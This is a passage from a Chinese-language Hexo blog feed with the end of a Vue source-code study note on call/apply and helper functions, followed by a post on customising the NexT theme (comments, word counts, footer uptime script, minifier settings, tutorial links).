class="line"><span class="comment">// People.call(this, name, age);中的this代表的是Student，这也就是之前说的，使得Student可以调用People中的方法，因为People中有this.name = name;等语句，这样就将name和age属性创建到了Student中。</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 总结一句话就是call()可以让括号里的对象来继承括号外函数的属性。</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// People.apply(this, [name, age]); 等价于 People.apply(this, arguments);</span></span><br></pre></td></tr></table></figure><p>apply()的其他用法</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Math</span>.max(<span class="number">12</span>, <span class="number">5</span>, <span class="number">7</span>); <span class="comment">// 得到12</span></span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 将Math.max接收的参数由(a,b,c)改为[a,b,c]</span></span><br><span class="line"><span class="built_in">Math</span>.max.apply(<span class="literal">null</span>, [<span class="number">12</span>, <span class="number">5</span>, <span class="number">7</span>]); <span class="comment">// 得到12</span></span><br></pre></td></tr></table></figure><p>同理 Math.min 也可以</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> arr1 = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>];</span><br><span class="line"><span class="keyword">let</span> arr2 = [<span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>];</span><br><span class="line"><span class="built_in">Array</span>.prototype.push.apply(arr1, arr2); <span class="comment">//把arr2合并到arr1中,得到的arr1为[1,2,3,4,5,6]</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> arr3 = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>];</span><br><span class="line"><span class="keyword">let</span> arr4 = [<span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>];</span><br><span class="line">arr3.push.apply(arr3, arr4); <span class="comment">// 把arr4合并到arr3中,得到的arr3为[1,2,3,4,5,6]</span></span><br><span class="line"><span class="comment">// 或者使用[].push.apply(arr3,arr4)也可以达到同样的目的</span></span><br></pre></td></tr></table></figure><h2 id="研究对象-10"><a href="#研究对象-10" class="headerlink" title="研究对象"></a>研究对象</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@function </span>将list转换为数组类型，允许从start开始截断数组</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@params </span>list 需要转换的数组</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@params </span>start 需要转换的开始位置，默认从0开始</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">toArray</span>(<span class="params">list, start</span>) </span>&#123;</span><br><span class="line">  start = start || <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">var</span> i = list.length - start;</span><br><span class="line">  <span class="keyword">var</span> ret = <span class="keyword">new</span> <span class="built_in">Array</span>(i);</span><br><span class="line">  <span class="keyword">while</span> (i--) &#123;</span><br><span class="line">    ret[i] = list[i + start];</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Mix properties into target object.</span></span><br><span class="line"><span class="comment"> * 将属性混合到目标对象中</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@function </span>将_form插入到to对象中</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@params </span>to 原对象，目标对象</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@params </span>_from 待被插入到to对象的基本对象或数组</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">extend</span>(<span class="params">to, _from</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">var</span> key <span class="keyword">in</span> _from) &#123;</span><br><span class="line">    to[key] = _from[key];</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> to;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Merge an Array of Objects into a single Object.</span></span><br><span class="line"><span class="comment"> * 将对象数组合并到单个对象</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@function </span>调用extend，将arr数组转换为对象</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@params <span class="variable">arr</span></span></span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">toObject</span>(<span class="params">arr</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> res = &#123;&#125;;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; arr.length; i++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (arr[i]) &#123;</span><br><span class="line">      extend(res, arr[i]);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol><li>处理数组，截断数组 <code>toArray(list,start)</code></li><li>处理对象，将对象或者数组插入到对象中 <code>extend(to,_from)</code></li><li>处理对象，将数组转换为对象 <code>toObject(arr)</code></li></ol><p>— <em>待更新-2020-02-28</em> —</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla
      
    
    </summary>
    
    
      <category term="Vue" scheme="http://yoursite.com/categories/Vue/"/>
    
    
      <category term="笔记" scheme="http://yoursite.com/tags/%E7%AC%94%E8%AE%B0/"/>
    
      <category term="Vue源码" scheme="http://yoursite.com/tags/Vue%E6%BA%90%E7%A0%81/"/>
    
  </entry>
  
  <entry>
    <title>博客及主题优化</title>
    <link href="http://yoursite.com/hexo%E5%8D%9A%E5%AE%A2/20200225-bf65917.html"/>
    <id>http://yoursite.com/hexo%E5%8D%9A%E5%AE%A2/20200225-bf65917.html</id>
    <published>2020-02-25T08:44:02.000Z</published>
    <updated>2021-04-08T03:18:06.378Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="踩坑记录"><a href="#踩坑记录" class="headerlink" title="踩坑记录"></a>踩坑记录</h2><ol><li><p>hexo g 报错</p><p>报错如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Error: expected end of comment, got end of file</span><br><span class="line">at Object._prettifyError (...@3.2.1@nunjucks\src\lib.js:36:11)</span><br></pre></td></tr></table></figure></li></ol><p>  原因：<br>  由于md文档需要转换为html文件，其文档中不允许出来类似的语法</p><p>  解决方案：<br>  避免md文档中出现类似的语法</p><hr><h2 id="开启评论及阅读"><a href="#开启评论及阅读" class="headerlink" title="开启评论及阅读"></a>开启评论及阅读</h2><p>在 themes\next_config.yml 中修改如下</p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">valine:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">appid:</span> <span class="string">YourID</span> <span class="comment"># Your leancloud application appid</span></span><br><span class="line">  <span class="attr">appkey:</span> <span class="string">YourKEY</span> <span class="comment"># Your leancloud application appkey</span></span><br><span class="line">  <span class="attr">notify:</span> <span class="literal">true</span> <span class="comment"># Mail notifier</span></span><br><span class="line">  <span class="attr">verify:</span> <span class="literal">true</span> <span class="comment"># Verification code</span></span><br><span class="line">  <span class="attr">placeholder:</span> <span class="string">欢迎留言...</span> <span class="comment"># Comment box placeholder</span></span><br><span class="line">  <span class="attr">avatar:</span> <span class="string">identicon</span> <span class="comment"># Gravatar style</span></span><br><span class="line">  <span class="attr">guest_info:</span> <span class="string">nick,mail,link</span> <span class="comment"># Custom comment header</span></span><br><span class="line">  <span class="attr">pageSize:</span> <span class="number">10</span> <span class="comment"># Pagination size</span></span><br><span class="line">  <span class="attr">language:</span> <span class="comment"># Language, available values: en, zh-cn</span></span><br><span class="line">  <span class="attr">visitor:</span> <span class="literal">true</span> <span class="comment">#true # Article reading statistic</span></span><br><span class="line">  <span class="attr">comment_count:</span> <span class="literal">true</span> <span class="comment"># If false, comment count will only be displayed in post page, not in home page</span></span><br><span class="line">  <span class="attr">recordIP:</span> <span class="literal">true</span> <span class="comment"># Whether to record the commenter IP</span></span><br><span class="line">  <span class="attr">serverURLs:</span> <span class="comment"># When the custom domain name is enabled, fill it in here (it will be detected automatically by default, no need to fill in)</span></span><br><span class="line">  <span class="comment">#post_meta_order: 0</span></span><br></pre></td></tr></table></figure><p>其中 YourID 及 YourKEY 为 leancloud 中’评论量’的 id 及 key</p><h2 id="将每篇文章的下方的标签的-改为图标"><a href="#将每篇文章的下方的标签的-改为图标" class="headerlink" title="将每篇文章的下方的标签的#改为图标"></a>将每篇文章的下方的标签的#改为图标</h2><p>在 themes\next_config.yml 中修改属性</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tag_icon: true</span><br></pre></td></tr></table></figure><h2 id="为文章新增阅读时长及文章字数统计"><a href="#为文章新增阅读时长及文章字数统计" class="headerlink" title="为文章新增阅读时长及文章字数统计"></a>为文章新增阅读时长及文章字数统计</h2><p>先安装插件<br><code>npm install hexo-symbols-count-time --save</code></p><p>在 themes\next_config.yml 中新增或者修改如下</p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">symbols_count_time:</span></span><br><span class="line">  <span class="attr">separated_meta:</span> <span class="literal">true</span> <span class="comment"># 是否另起一行（true的话不和发表时间等同一行）</span></span><br><span class="line">  <span class="attr">item_text_post:</span> <span class="literal">true</span> <span class="comment"># 首页文章统计数量前是否显示文字描述（本文字数、阅读时长）</span></span><br><span class="line">  <span class="attr">item_text_total:</span> <span class="literal">false</span> <span class="comment"># 页面底部统计数量前是否显示文字描述（站点总字数、站点阅读时长）</span></span><br><span class="line">  <span class="attr">awl:</span> <span class="number">4</span> <span class="comment"># Average Word Length</span></span><br><span class="line">  <span class="attr">wpm:</span> <span class="number">275</span> <span class="comment"># Words Per Minute（每分钟阅读词数）</span></span><br><span class="line">  <span class="attr">suffix:</span> <span class="string">mins.</span></span><br></pre></td></tr></table></figure><p>在_config.yml 中新增</p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">symbols_count_time:</span></span><br><span class="line">  <span class="attr">symbols:</span> <span class="literal">true</span> <span class="comment"># 文章字数统计</span></span><br><span class="line">  <span class="attr">time:</span> <span class="literal">true</span> <span class="comment"># 文章阅读时长</span></span><br><span class="line">  <span class="attr">total_symbols:</span> <span class="literal">true</span> <span class="comment"># 站点总字数统计</span></span><br><span class="line">  <span class="attr">total_time:</span> <span class="literal">true</span> <span class="comment"># 站点总阅读时长</span></span><br><span class="line">  <span class="attr">exclude_codeblock:</span> <span class="literal">false</span> <span class="comment"># 排除代码字数统计</span></span><br></pre></td></tr></table></figure><h2 id="更换-next-默认头像"><a href="#更换-next-默认头像" class="headerlink" title="更换 next 默认头像"></a>更换 next 默认头像</h2><p>在 themes\next_config.yml 的 avatar 中修改 url 属性，例如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">avatar:</span><br><span class="line">  url: /images/ashen_head.jpg</span><br></pre></td></tr></table></figure><h2 id="新建热度排行榜"><a href="#新建热度排行榜" class="headerlink" title="新建热度排行榜"></a>新建热度排行榜</h2><p>教程：<a href="https://blog.qust.cc/archives/48665.html" rel="external nofollow noopener noreferrer" target="_blank">https://blog.qust.cc/archives/48665.html</a></p><p>BUG 修改：<a href="https://www.dazhuanlan.com/2019/08/17/5d576bec311dc/" rel="external nofollow noopener noreferrer" target="_blank">https://www.dazhuanlan.com/2019/08/17/5d576bec311dc/</a></p><p>代码纠正</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> query = <span class="keyword">new</span> AV.Query(<span class="string">"Counter"</span>);</span><br><span class="line"><span class="keyword">if</span> (request.object.updatedKeys.indexOf(<span class="string">"time"</span>) !== <span class="number">-1</span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> query.get(request.object.id).then(<span class="function"><span class="keyword">function</span>(<span class="params">obj</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (obj.get(<span class="string">"time"</span>) &gt; request.object.get(<span class="string">"time"</span>)) &#123;</span><br><span class="line">      <span class="keyword">throw</span> <span class="keyword">new</span> AV.Cloud.Error(<span class="string">"Invalid update!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> request.object.save();</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="添加-Github-丝带或者角标-amp-添加-RSS-订阅-amp-添加动态背景-amp-文章结尾添加结束标记-amp-主页文章添加阴影效果"><a href="#添加-Github-丝带或者角标-amp-添加-RSS-订阅-amp-添加动态背景-amp-文章结尾添加结束标记-amp-主页文章添加阴影效果" class="headerlink" title="添加 Github 丝带或者角标&amp;添加 RSS 订阅&amp;添加动态背景&amp;文章结尾添加结束标记&amp;主页文章添加阴影效果"></a>添加 Github 丝带或者角标&amp;添加 RSS 订阅&amp;添加动态背景&amp;文章结尾添加结束标记&amp;主页文章添加阴影效果</h2><p>教程：<a href="https://blog.csdn.net/Z_Z_W_/article/details/97617436" rel="external nofollow noopener noreferrer" target="_blank">https://blog.csdn.net/Z<em>Z_W</em>/article/details/97617436</a></p><h3 id="添加动态背景无效解决方案"><a href="#添加动态背景无效解决方案" class="headerlink" title="添加动态背景无效解决方案"></a>添加动态背景无效解决方案</h3><p>链接：<a href="https://www.jianshu.com/p/b9556119ee8a" rel="external nofollow noopener noreferrer" target="_blank">https://www.jianshu.com/p/b9556119ee8a</a></p><p><code>cd themes/next</code><br><code>git clone https://github.com/theme-next/theme-next-canvas-nest source/lib/canvas-nest</code></p><h3 id="主页文章添加阴影效果解决方案-四楼"><a href="#主页文章添加阴影效果解决方案-四楼" class="headerlink" title="主页文章添加阴影效果解决方案-四楼"></a>主页文章添加阴影效果解决方案-四楼</h3><p>链接：<a href="https://tieba.baidu.com/p/6365333284?traceid=" rel="external nofollow noopener noreferrer" target="_blank">https://tieba.baidu.com/p/6365333284?traceid=</a></p><h2 id="添加搜索功能-amp-添加相关文章功能"><a href="#添加搜索功能-amp-添加相关文章功能" class="headerlink" title="添加搜索功能&amp;添加相关文章功能"></a>添加搜索功能&amp;添加相关文章功能</h2><p>教程：<a href="http://bamshoot.coding.me/posts/84fe2c24.html" rel="external nofollow noopener noreferrer" target="_blank">http://bamshoot.coding.me/posts/84fe2c24.html</a></p><h2 id="SEO-优化-amp-文章持久化"><a href="#SEO-优化-amp-文章持久化" class="headerlink" title="SEO 优化&amp;文章持久化"></a>SEO 优化&amp;文章持久化</h2><p>设置收录时，若为 next 主题，则直接在<code>themes\next\_config.yml</code>中对应的<code>google_site_verification</code>及<code>baidu_site_verification</code>中添加对应的 content 即可</p><p>（手动推送）教程参考：<a href="http://dugblog.coding.me/Hexo/20180625-Hexo-SEO.html" rel="external nofollow noopener noreferrer" target="_blank">http://dugblog.coding.me/Hexo/20180625-Hexo-SEO.html</a></p><p>文章持久化-算法参考：<a href="http://bamshoot.coding.me/posts/84fe2c24.html" rel="external nofollow noopener noreferrer" target="_blank">http://bamshoot.coding.me/posts/84fe2c24.html</a></p><h2 id="添加顶部加载条-amp-文章加密访问-amp-修改字体大小"><a href="#添加顶部加载条-amp-文章加密访问-amp-修改字体大小" class="headerlink" title="添加顶部加载条&amp;文章加密访问&amp;修改字体大小"></a>添加顶部加载条&amp;文章加密访问&amp;修改字体大小</h2><p>教程：<a href="https://www.jianshu.com/p/f054333ac9e6" rel="external nofollow noopener noreferrer" target="_blank">https://www.jianshu.com/p/f054333ac9e6</a></p><h2 id="为博客加上萌萌的宠物"><a href="#为博客加上萌萌的宠物" class="headerlink" title="为博客加上萌萌的宠物"></a>为博客加上萌萌的宠物</h2><p>教程：<a href="https://blog.csdn.net/mqdxiaoxiao/article/details/93793530" rel="external nofollow noopener noreferrer" target="_blank">https://blog.csdn.net/mqdxiaoxiao/article/details/93793530</a></p><h2 id="百度统计"><a href="#百度统计" class="headerlink" title="百度统计"></a>百度统计</h2><p>教程：<a href="https://blog.csdn.net/loze/article/details/94212661" rel="external nofollow noopener noreferrer" target="_blank">https://blog.csdn.net/loze/article/details/94212661</a></p><h2 id="在底部增加运行时间"><a href="#在底部增加运行时间" class="headerlink" title="在底部增加运行时间"></a>在底部增加运行时间</h2><p>在 themes\next\layout_partials\footer.swig 中新增</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- 在网页底部添加网站运行时间 --&gt;</span><br><span class="line">&lt;div&gt;</span><br><span class="line">&lt;span id=<span class="string">"timeDate"</span>&gt;载入天数...&lt;<span class="regexp">/span&gt;&lt;span id="times"&gt;载入时分秒...&lt;/</span>span&gt;</span><br><span class="line">&lt;<span class="regexp">/div&gt;</span></span><br><span class="line"><span class="regexp">&lt;script&gt;</span></span><br><span class="line"><span class="regexp">    var now = new Date();</span></span><br><span class="line"><span class="regexp">    function createtime() &#123;</span></span><br><span class="line"><span class="regexp">        var grt= new Date("07/</span><span class="number">21</span>/<span class="number">2018</span> <span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span><span class="string">");//此处修改你的建站时间或者网站上线时间</span></span><br><span class="line"><span class="string">        now.setTime(now.getTime()+250);</span></span><br><span class="line"><span class="string">        days = (now - grt ) / 1000 / 60 / 60 / 24; dnum = Math.floor(days);</span></span><br><span class="line"><span class="string">        hours = (now - grt ) / 1000 / 60 / 60 - (24 * dnum); hnum = Math.floor(hours);</span></span><br><span class="line"><span class="string">        if(String(hnum).length ==1 )&#123;hnum = "</span><span class="number">0</span><span class="string">" + hnum;&#125; minutes = (now - grt ) / 1000 /60 - (24 * 60 * dnum) - (60 * hnum);</span></span><br><span class="line"><span class="string">        mnum = Math.floor(minutes); if(String(mnum).length ==1 )&#123;mnum = "</span><span class="number">0</span><span class="string">" + mnum;&#125;</span></span><br><span class="line"><span class="string">        seconds = (now - grt ) / 1000 - (24 * 60 * 60 * dnum) - (60 * 60 * hnum) - (60 * mnum);</span></span><br><span class="line"><span class="string">        snum = Math.round(seconds); if(String(snum).length ==1 )&#123;snum = "</span><span class="number">0</span><span class="string">" + snum;&#125;</span></span><br><span class="line"><span class="string">        document.getElementById("</span>timeDate<span class="string">").innerHTML = "</span>Run <span class="keyword">for</span> <span class="string">"+dnum+"</span> Days <span class="string">";</span></span><br><span class="line"><span class="string">        document.getElementById("</span>times<span class="string">").innerHTML = hnum + "</span> Hours <span class="string">" + mnum + "</span> m <span class="string">" + snum + "</span> s<span class="string">";</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">setInterval("</span>createtime()<span class="string">",250);</span></span><br><span class="line"><span class="string">&lt;/script&gt;</span></span><br></pre></td></tr></table></figure><p>参考链接:<a href="https://www.jianshu.com/p/1ff2fcbdd155" rel="external nofollow noopener noreferrer" target="_blank">https://www.jianshu.com/p/1ff2fcbdd155</a></p><h2 id="相册功能"><a href="#相册功能" class="headerlink" title="相册功能"></a>相册功能</h2><p>坑：若运行 tool.py，先确定在 hexo_res 中是否已经存在 photos 及 min_photos</p><p>参考链接：<a href="https://malizhi.cn/HexoAlbum/" rel="external nofollow noopener noreferrer" target="_blank">https://malizhi.cn/HexoAlbum/</a></p><h2 id="样式取消"><a href="#样式取消" class="headerlink" title="样式取消"></a>样式取消</h2><p>让 source 某文件不被 layout 样式影响，在站点的<code>_config.yml</code>中的<code>skip_render:</code>加上对应的文件夹或者文件名</p><p>参考链接:<a href="http://dugblog.coding.me/Hexo/20180620-hexo-private-customization.html" rel="external nofollow noopener noreferrer" target="_blank">http://dugblog.coding.me/Hexo/20180620-hexo-private-customization.html</a></p><h2 id="使用hexo-all-minifier优化hexo访问速度"><a href="#使用hexo-all-minifier优化hexo访问速度" class="headerlink" title="使用hexo-all-minifier优化hexo访问速度"></a>使用hexo-all-minifier优化hexo访问速度</h2><p><code>cnpm install hexo-all-minifier --save</code></p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">"name"</span>: <span class="string">"hexo-site"</span>,</span><br><span class="line">  <span class="attr">"version"</span>: <span class="string">"0.0.0"</span>,</span><br><span class="line">  <span class="attr">"private"</span>: <span class="literal">true</span>,</span><br><span class="line">  <span class="attr">"hexo"</span>: &#123;</span><br><span class="line">    <span class="attr">"version"</span>: <span class="string">"3.9.0"</span></span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">"dependencies"</span>: &#123;</span><br><span class="line">    <span class="attr">"babel-runtime"</span>: <span class="string">"^6.26.0"</span>,</span><br><span class="line">    <span class="attr">"hexo"</span>: <span class="string">"^3.9.0"</span>,</span><br><span class="line">    <span class="attr">"hexo-abbrlink"</span>: <span class="string">"^2.0.5"</span>,</span><br><span class="line">    <span class="attr">"hexo-admin"</span>: <span class="string">"^2.3.0"</span>,</span><br><span class="line">    <span class="comment">// + "hexo-all-minifier": "^0.5.3",</span></span><br><span class="line">    <span class="attr">"hexo-autonofollow"</span>: <span class="string">"^1.0.1"</span>,</span><br><span class="line">    <span class="attr">"hexo-baidu-url-submit"</span>: <span class="string">"^0.0.6"</span>,</span><br><span class="line">    <span class="attr">"hexo-deployer-git"</span>: <span class="string">"^1.0.0"</span>,</span><br><span class="line">    <span class="attr">"hexo-generator-archive"</span>: <span class="string">"^0.1.5"</span>,</span><br><span class="line">    <span class="attr">"hexo-generator-category"</span>: <span class="string">"^0.1.3"</span>,</span><br><span class="line">    <span class="attr">"hexo-generator-feed"</span>: <span class="string">"^2.2.0"</span>,</span><br><span class="line">    <span class="attr">"hexo-generator-index"</span>: <span class="string">"^0.2.1"</span>,</span><br><span class="line">    <span class="attr">"hexo-generator-searchdb"</span>: <span class="string">"^1.2.0"</span>,</span><br><span class="line">    <span class="attr">"hexo-generator-sitemap"</span>: <span class="string">"^2.0.0"</span>,</span><br><span class="line">    <span class="attr">"hexo-generator-tag"</span>: <span class="string">"^0.2.0"</span>,</span><br><span class="line">    <span class="attr">"hexo-helper-live2d"</span>: <span class="string">"^3.1.1"</span>,</span><br><span class="line">    <span class="attr">"hexo-leancloud-counter-security"</span>: <span class="string">"^1.4.1"</span>,</span><br><span class="line">    <span class="attr">"hexo-renderer-ejs"</span>: <span class="string">"^0.3.1"</span>,</span><br><span class="line">    <span class="attr">"hexo-renderer-marked"</span>: <span class="string">"^0.3.2"</span>,</span><br><span class="line">    <span class="attr">"hexo-renderer-stylus"</span>: <span class="string">"^0.3.3"</span>,</span><br><span class="line">    <span class="attr">"hexo-server"</span>: <span class="string">"^0.3.3"</span>,</span><br><span class="line">    <span class="attr">"hexo-symbols-count-time"</span>: <span class="string">"^0.7.0"</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在站点的_config.yml中配置<br><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">tml_minifier:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">exclude:</span> </span><br><span class="line"></span><br><span class="line"><span class="attr">css_minifier:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">exclude:</span> </span><br><span class="line">    <span class="bullet">-</span> <span class="string">'*.min.css'</span></span><br><span class="line"></span><br><span class="line"><span class="attr">js_minifier:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">mangle:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">output:</span></span><br><span class="line">  <span class="attr">compress:</span></span><br><span class="line">  <span class="attr">exclude:</span> </span><br><span class="line">    <span class="bullet">-</span> <span class="string">'*.min.js'</span></span><br></pre></td></tr></table></figure></p><p>参考链接：<a href="https://www.difashi.com/2020-02/20-hexo-minifier.html" rel="external nofollow noopener noreferrer" target="_blank">https://www.difashi.com/2020-02/20-hexo-minifier.html</a></p><h2 id="图片放大镜功能"><a href="#图片放大镜功能" class="headerlink" title="图片放大镜功能"></a>图片放大镜功能</h2><p>在<code>themes\next\_config.yml</code>中设置</p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">fancybox:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure><h2 id="增加音乐播放器"><a href="#增加音乐播放器" class="headerlink" title="增加音乐播放器"></a>增加音乐播放器</h2><p><a href="https://music.163.com/#/playlist?id=377283757" rel="external nofollow noopener noreferrer" target="_blank">https://music.163.com/#/playlist?id=377283757</a></p><p>参考链接：<a href="https://www.jianshu.com/p/f1005ae09e5a" rel="external nofollow noopener noreferrer" target="_blank">https://www.jianshu.com/p/f1005ae09e5a</a></p><h2 id="YAMLException-end-of-the-stream-or-a-document-separator-is-expected…"><a href="#YAMLException-end-of-the-stream-or-a-document-separator-is-expected…" class="headerlink" title="YAMLException: end of the stream or a document separator is expected…"></a>YAMLException: end of the stream or a document separator is expected…</h2><p>报错例子：<br><figure 